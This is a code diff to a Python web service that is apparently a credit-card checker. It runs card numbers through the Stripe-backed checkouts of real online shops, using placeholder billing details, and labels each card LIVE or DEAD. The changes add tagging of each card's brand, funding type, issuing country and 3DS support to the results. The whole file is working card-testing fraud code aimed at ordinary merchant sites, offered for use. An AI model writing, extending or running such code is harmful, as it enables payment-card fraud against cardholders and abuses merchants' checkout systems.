@@ -22,9 +22,8 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.rotating.checker")
 
-app = FastAPI(title="Multi-Gate Rotating CC Checker", version="6.0.0")
+app = FastAPI(title="Rotating Sites CC Checker (Astra + Rollerco)", version="6.1.0")
 
-# --- SITE DEFINITIONS (ASTRA + ROLLERCO) ---
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "astra_store": {
         "name": "Astra Store (EDD + Stripe)",
@@ -289,7 +288,6 @@ async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str
     if not pk or not nonce:
         return "DEAD", "Checkout parameters missing", 200
 
-    # Elements session loader
     es_params = {
         "key": pk, "_stripe_version": "2025-09-30.clover", "type": "deferred_intent",
         "locale": "en-AU", "deferred_intent[mode]": "payment", "deferred_intent[amount]": "223",
@@ -348,6 +346,13 @@ async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str
     if not pm_token:
         return "DEAD", "No token returned", 200
 
+    card_meta = sj.get("card", {}) or {}
+    brand = (card_meta.get("display_brand") or card_meta.get("brand") or "?").upper()
+    funding = (card_meta.get("funding") or "?").upper()
+    country_code = card_meta.get("country") or "?"
+    tds = (card_meta.get("three_d_secure_usage") or {}).get("supported")
+    tag_meta = f"{brand}/{funding}/{country_code}" + ("/3DS" if tds else "")
+
     checkout_payload = {
         "billing_email": email, "billing_first_name": first, "billing_last_name": last,
         "billing_phone": phone, "billing_country": "AU", "billing_address_1": "23 Endeavour Drive",
@@ -371,11 +376,11 @@ async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str
 
         if result == "success":
             if any(x in redirect.lower() for x in ("authentication", "3ds", "stripe.com", "confirm_payment_intent")):
-                return "LIVE", "3DS Redirect Required"
-            return "LIVE", "Order completed successfully"
-        return "DEAD", clean_msg, res.status_code
+                return "LIVE", f"3DS Redirect Required | {tag_meta}"
+            return "LIVE", f"Order completed successfully | {tag_meta}"
+        return "DEAD", f"{clean_msg} | {tag_meta}", res.status_code
     except Exception:
-        return "DEAD", "The card has been declined for an unknown reason.", res.status_code
+        return "DEAD", f"The card has been declined for an unknown reason. | {tag_meta}", res.status_code
 
 
 async def run_auth_check(card_line: str, proxy_url: str | None = None, target_key: str = "rotate_clean") -> AuthVerdict:
